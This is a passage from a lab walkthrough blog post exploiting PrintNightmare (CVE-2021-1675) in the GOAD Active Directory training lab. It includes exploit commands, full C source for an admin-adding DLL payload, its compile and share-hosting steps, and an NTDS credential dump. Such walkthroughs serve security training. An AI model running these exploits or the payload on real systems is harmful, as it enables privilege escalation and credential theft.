</pre><td class="rouge-code"><pre>python3 CVE-2021-1675.py essos.local/jorah.mormont:<span class="s1">'H0nnor!'</span>@meereen.essos.local <span class="s1">'\\192.168.56.1\ATTACKERSHARE\nightmare.dll'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/pnightmare_exploit.png" alt="pnightmare_exploit.png" /></p><ul><li>The exploit worked</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/cme_smb_pnightmare_worked.png" alt="cme_smb_pnightmare_worked.png" /></p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/pnightmare_user_added.png" alt="pnightmare_user_added.png" /></p><blockquote><p>Wait, you use domain connection instead of –local-auth with cme no ?</p></blockquote><ul><li>Yes, this is because meereen is a domain controler:</ul><p><em>“Domain controllers do not have built-in or account domains. Also, instead of a SAM database, these systems use the Microsoft Active Directory directory service to store account access information.”</em></p><ul><li>see: https://docs.microsoft.com/en-us/windows/win32/secmgmt/built-in-and-account-domains</ul><h3 id="exploit-on-vulnerable-windows-server-2019-winterfell">Exploit on vulnerable windows server 2019 (winterfell)</h3><ul><li>Now try the same exploit on a vulnerable windows server 2019</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:<span class="s1">'iknownothing'</span>@north.sevenkingdoms.local <span class="s1">'\\192.168.56.1\ATTACKERSHARE\nightmare.dll'</span>
</pre></table></code></div></div><ul><li>And it works too but the user is not in the administrators group :(<li>Nothing due to the exploit, it is just our dll who add a user as administrator who get caught when user is setup as administrator</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/defender.png" alt="defender.png" /></p><ul><li><p>Good (thing) to know : after some failures the spooler service will be stopped by defender and no more exploit for you until someone restart the server or the spooler service.</p><li><p>Let’s change the payload with another code (source : https://github.com/newsoft/adduser )</p></ul><div class="language-c++ highlighter-rouge"><div class="code-header"> <span text-data=" C++ "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
</pre><td class="rouge-code"><pre><span class="cm">/*
 * ADDUSER.C: creating a Windows user programmatically.
 */</span>

<span class="cp">#define UNICODE
#define _UNICODE
</span>
<span class="cp">#include &lt;windows.h&gt;
#include &lt;string.h&gt;
#include &lt;lmaccess.h&gt;
#include &lt;lmerr.h&gt;
#include &lt;tchar.h&gt;
</span>

<span class="n">DWORD</span> <span class="nf">CreateAdminUserInternal</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">NET_API_STATUS</span> <span class="n">rc</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">b</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dw</span><span class="p">;</span>

    <span class="n">USER_INFO_1</span> <span class="n">ud</span><span class="p">;</span>
    <span class="n">LOCALGROUP_MEMBERS_INFO_0</span> <span class="n">gd</span><span class="p">;</span>
    <span class="n">SID_NAME_USE</span> <span class="n">snu</span><span class="p">;</span>

    <span class="n">DWORD</span> <span class="n">cbSid</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>    <span class="c1">// 256 bytes should be enough for everybody :)</span>
    <span class="n">BYTE</span> <span class="n">Sid</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="n">DWORD</span> <span class="n">cbDomain</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">);</span>
    <span class="n">TCHAR</span> <span class="n">Domain</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="c1">// Create user</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ud</span><span class="p">));</span>

    <span class="n">ud</span><span class="p">.</span><span class="n">usri1_name</span>        <span class="o">=</span> <span class="n">_T</span><span class="p">(</span><span class="s">"pnightmare2"</span><span class="p">);</span>                <span class="c1">// username</span>
    <span class="n">ud</span><span class="p">.</span><span class="n">usri1_password</span>    <span class="o">=</span> <span class="n">_T</span><span class="p">(</span><span class="s">"Test123456789!"</span><span class="p">);</span>             <span class="c1">// password</span>
    <span class="n">ud</span><span class="p">.</span><span class="n">usri1_priv</span>        <span class="o">=</span> <span class="n">USER_PRIV_USER</span><span class="p">;</span>                   <span class="c1">// cannot set USER_PRIV_ADMIN on creation</span>
    <span class="n">ud</span><span class="p">.</span><span class="n">usri1_flags</span>       <span class="o">=</span> <span class="n">UF_SCRIPT</span> <span class="o">|</span> <span class="n">UF_NORMAL_ACCOUNT</span><span class="p">;</span>    <span class="c1">// must be set</span>
    <span class="n">ud</span><span class="p">.</span><span class="n">usri1_script_path</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">rc</span> <span class="o">=</span> <span class="n">NetUserAdd</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>            <span class="c1">// local server</span>
        <span class="mi">1</span><span class="p">,</span>                <span class="c1">// information level</span>
        <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ud</span><span class="p">,</span>
        <span class="nb">NULL</span>            <span class="c1">// error value</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="n">NERR_Success</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">_tprintf</span><span class="p">(</span><span class="n">_T</span><span class="p">(</span><span class="s">"NetUserAdd FAIL %d 0x%08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">),</span> <span class="n">rc</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">rc</span><span class="p">;</span>
    <span class="p">}</span>

   <span class="n">_tprintf</span><span class="p">(</span><span class="n">_T</span><span class="p">(</span><span class="s">"NetUserAdd OK</span><span class="se">\r\n</span><span class="s">"</span><span class="p">),</span> <span class="n">rc</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>

    <span class="c1">// Get user SID</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">LookupAccountName</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>            <span class="c1">// local server</span>
        <span class="n">ud</span><span class="p">.</span><span class="n">usri1_name</span><span class="p">,</span>   <span class="c1">// account name</span>
        <span class="n">Sid</span><span class="p">,</span>             <span class="c1">// SID</span>
        <span class="o">&amp;</span><span class="n">cbSid</span><span class="p">,</span>          <span class="c1">// SID size</span>
        <span class="n">Domain</span><span class="p">,</span>          <span class="c1">// Domain</span>
        <span class="o">&amp;</span><span class="n">cbDomain</span><span class="p">,</span>       <span class="c1">// Domain size</span>
        <span class="o">&amp;</span><span class="n">snu</span>             <span class="c1">// SID_NAME_USE (enum)</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dw</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
        <span class="n">_tprintf</span><span class="p">(</span><span class="n">_T</span><span class="p">(</span><span class="s">"LookupAccountName FAIL %d 0x%08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">),</span> <span class="n">dw</span><span class="p">,</span> <span class="n">dw</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">dw</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Add user to "Administrators" local group</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">gd</span><span class="p">));</span>

    <span class="n">gd</span><span class="p">.</span><span class="n">lgrmi0_sid</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSID</span><span class="p">)</span><span class="n">Sid</span><span class="p">;</span>

    <span class="n">rc</span> <span class="o">=</span> <span class="n">NetLocalGroupAddMembers</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local server</span>
        <span class="n">_T</span><span class="p">(</span><span class="s">"Administrators"</span><span class="p">),</span>
        <span class="mi">0</span><span class="p">,</span>                        <span class="c1">// information level</span>
        <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">gd</span><span class="p">,</span>
        <span class="mi">1</span>                        <span class="c1">// only one entry</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="n">NERR_Success</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">_tprintf</span><span class="p">(</span><span class="n">_T</span><span class="p">(</span><span class="s">"NetLocalGroupAddMembers FAIL %d 0x%08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">),</span> <span class="n">rc</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">rc</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//</span>
<span class="c1">// DLL entry point.</span>
<span class="c1">//</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
        <span class="n">CreateAdminUserInternal</span><span class="p">();</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// RUNDLL32 entry point</span>
<span class="cp">#ifdef __cplusplus
</span><span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
<span class="cp">#endif
</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="kr">__stdcall</span> <span class="n">CreateAdminUser</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hinst</span><span class="p">,</span> <span class="n">LPSTR</span> <span class="n">lpszCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">CreateAdminUserInternal</span><span class="p">();</span>
<span class="p">}</span>

<span class="cp">#ifdef __cplusplus
</span><span class="p">}</span>
<span class="cp">#endif
</span>
<span class="c1">// Command-line entry point.</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">CreateAdminUserInternal</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li>with this payload we can bypass defender and add our user as administrator<li>compile</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x86_64-w64-mingw32-gcc <span class="nt">-shared</span> <span class="nt">-opnightmare2</span>.dll adduser.c <span class="nt">-lnetapi32</span>
</pre></table></code></div></div><ul><li>prepare the share</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbserver.py <span class="nt">-smb2support</span> ATTACKERSHARE <span class="nb">.</span>
</pre></table></code></div></div><ul><li>relaunch the exploit</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:<span class="s1">'iknownothing'</span>@winterfell.north.sevenkingdoms.local <span class="s1">'\\192.168.56.1\ATTACKERSHARE\pnightmare2.dll'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/printnightmare_newpayload.png" alt="printnightmare_newpayload.png" /></p><ul><li>And enjoy your new admin account by dumping the ntds :)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme smb winterfell.north.sevenkingdoms.local <span class="nt">-u</span> pnightmare2 <span class="nt">-p</span> <span class="s1">'Test123456789!'</span> <span class="nt">--ntds</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/cme_admin_ntds.png" alt="cme_admin_ntds.png" /></p><h3 id="cleanup">cleanup</h3><ul><li>After the exploitation you will find your dlls inside : <code class="language-plaintext highlighter-rouge">C:\Windows\System32\spool\drivers\x64\3</code></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/pnightmare_traces.png" alt="pnightmare_traces.png" /></p><ul><li>And also inside : <code class="language-plaintext highlighter-rouge">C:\Windows\System32\spool\drivers\x64\3\Old\{id}\</code></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/traces_old.png" alt="traces_old.png" /></p><ul><li>Don’t forget to clean up ;)</ul><p>Next time we will have fun with ADCS (Certifried, ESC1, ESC8, …) : : <a href="/posts/GOADv2-pwning-part6/">Goad pwning part6</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ad/'>AD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD,</a> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab,</a> <a href="/tags/samaccountname/" class="post-tag no-text-decoration" >samaccountname,</a> <a href="/tags/nopac/" class="post-tag no-text-decoration" >nopac,</a> <a href="/tags/printnightmare/" class="post-tag no-text-decoration" >printnightmare</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GOAD - part 5 - exploit with user - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part5/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GOAD - part 5 - exploit with user - Mayfly&u=https://mayfly277.github.io/posts/GOADv2-pwning-part5/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=GOAD - part 5 - exploit with user - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part5/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/GOADv2-pwning_part1/">GOAD - part 1 - reconnaissance and scan</a><li><a href="/posts/GOADv2-pwning-part2/">GOAD - part 2 - find users</a><li><a href="/posts/GOADv2-pwning-part3/">GOAD - part 3 - enumeration with user</a><li><a href="/posts/GOADv2-pwning-part4/">GOAD - part 4 - poison and relay</a><li><a href="/posts/GOADv2-pwning-part5/">GOAD - part 5 - exploit with user</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE-2022-35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/GOADv2-pwning_part1/"><div class="card-body"> <span class="timeago small" >Jul 3<i class="unloaded">2022-07-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 1 - reconnaissance and scan</h3><div class="text-muted small"><p> The lab is now up and running Goad introduction, let’s do some recon on it. Enumerate Network We will starting the reconnaissance of the Game Of Active Directory environment by searching all the ...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part2/"><div class="card-body"> <span class="timeago small" >Jul 4<i class="unloaded">2022-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 2 - find users</h3><div class="text-muted small"><p> We have done some basic reconnaissance on Goad pwning part1, now we will try to enumerate users and start to hunt credentials. Enumerate DC’s anonymously With CME cme smb 192.168.56.11 --users...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part3/"><div class="card-body"> <span class="timeago small" >Jul 7<i class="unloaded">2022-07-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 3 - enumeration with user</h3><div class="text-muted small"><p> We found some users on Goad pwning part2, now let see what we can do with those creds. User listing When you get an account on an active directory, the first thing to do is always getting th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/GOADv2-pwning-part4/" class="btn btn-outline-primary" prompt="Older"><p>GOAD - part 4 - poison and relay</p></a> <a href="/posts/GOADv2-pwning-part6/" class="btn btn-outline-primary" prompt="Newer"><p>GOAD - part 6 - ADCS</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/M4yFly">mayfly</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE 2022 35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
